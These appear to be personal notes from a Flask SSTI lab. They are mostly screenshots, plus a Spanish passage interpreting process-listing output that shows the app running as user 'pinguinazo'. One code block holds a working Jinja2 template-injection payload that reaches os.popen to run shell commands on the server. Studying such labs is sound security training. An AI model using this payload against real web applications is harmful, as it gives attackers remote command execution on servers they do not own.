![](Pasted%20image%2020250228114121.png)
![](Pasted%20image%2020250228114606.png)

![](Pasted%20image%2020250228114822.png)

![](Pasted%20image%2020250228115236.png)
![](Pasted%20image%2020250228115744.png)

![](Pasted%20image%2020250228115846.png)

![](Pasted%20image%2020250228122517.png)

![](Pasted%20image%2020250228122546.png)

![](Pasted%20image%2020250228123633.png)

![](Pasted%20image%2020250228122639.png)

![](Pasted%20image%2020250228124134.png)

![](Pasted%20image%2020250228124206.png)

``` bash
{{request.application.__globals__.__builtins__.__import__('os').popen('echo whoami | bash').read()}}
```

![](Pasted%20image%2020250228124241.png)

![](Pasted%20image%2020250228124404.png)

![](Pasted%20image%2020250228124905.png)

![](Pasted%20image%2020250228125434.png)

![](Pasted%20image%2020250228125509.png)

![](Pasted%20image%2020250228125641.png)

![](Pasted%20image%2020250228130334.png)

![](Pasted%20image%2020250228130717.png)

![](Pasted%20image%2020250228130743.png)

![](Pasted%20image%2020250228130828.png)

![](Pasted%20image%2020250228131112.png)

![](Pasted%20image%2020250228131145.png)

![](Pasted%20image%2020250228132445.png)

![](Pasted%20image%2020250228133123.png)

![](Pasted%20image%2020250228135757.png)
Viendo la salida de tu comando `ps aux | grep app.py`, parece que la aplicación Flask está siendo ejecutada por el usuario `pinguinazo` con el siguiente comando:

`python3 /home/pinguinazo/flask_ssti_lab/app.py`

Además, observamos que el comando está siendo ejecutado a través de un `su` (Switch User), lo que significa que la aplicación se ejecuta como un usuario específico en lugar de como root.







